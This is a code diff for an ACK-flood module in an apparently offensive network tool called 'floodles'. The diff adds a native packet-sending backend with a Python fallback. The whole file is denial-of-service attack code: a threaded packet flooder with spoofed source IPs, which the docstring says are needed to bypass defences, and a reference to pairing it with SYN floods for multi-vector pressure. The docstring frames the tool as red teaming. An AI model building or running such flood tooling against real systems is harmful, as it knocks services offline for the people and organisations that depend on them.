@@ -23,8 +23,7 @@ Use case in red teaming:
   3. Combined with SYN flood: multi-vector Layer 4 pressure
 """
 
-from floodles.core.packet_builder import PacketBuilder
-from floodles.core.sender import FloodEngine
+from floodles.core.sender import FloodEngine, NativeFloodEngine, make_engine
 
 
 def run(
@@ -34,6 +33,7 @@ def run(
     pps_limit: int = 0,
     duration: int = 30,
     spoof: bool = True,
+    force_python: bool = False,
 ) -> FloodEngine:
     """
     Launch ACK flood.
@@ -45,21 +45,37 @@ def run(
         pps_limit : PPS cap.
         duration  : Duration in seconds.
         spoof     : Randomize source IP (required for bypass effectiveness).
+        force_python : Force Python backend (debug).
 
     Returns:
-        FloodEngine (already started).
+        FloodEngine or NativeFloodEngine (already started).
     """
-    builder = PacketBuilder()
-
-    def make_packet() -> bytes:
-        return builder.ack(dst_ip, dst_port, spoof=spoof)
-
-    engine = FloodEngine(
-        packet_fn=make_packet,
+    engine = make_engine(
+        packet_fn=None,
         dst_ip=dst_ip,
+        port=dst_port,
+        pkt_type=NativeFloodEngine.PKT_ACK,
         threads=threads,
         pps_limit=pps_limit,
         duration=duration,
+        spoof=spoof,
+        force_python=force_python,
     )
+
+    if not isinstance(engine, NativeFloodEngine):
+        from floodles.core.native_bridge import get_packet_builder
+        builder = get_packet_builder()
+
+        def make_packet() -> bytes:
+            return builder.ack(dst_ip, dst_port, spoof=spoof)
+
+        engine = FloodEngine(
+            packet_fn=make_packet,
+            dst_ip=dst_ip,
+            threads=threads,
+            pps_limit=pps_limit,
+            duration=duration,
+        )
+
     engine.start()
     return engine
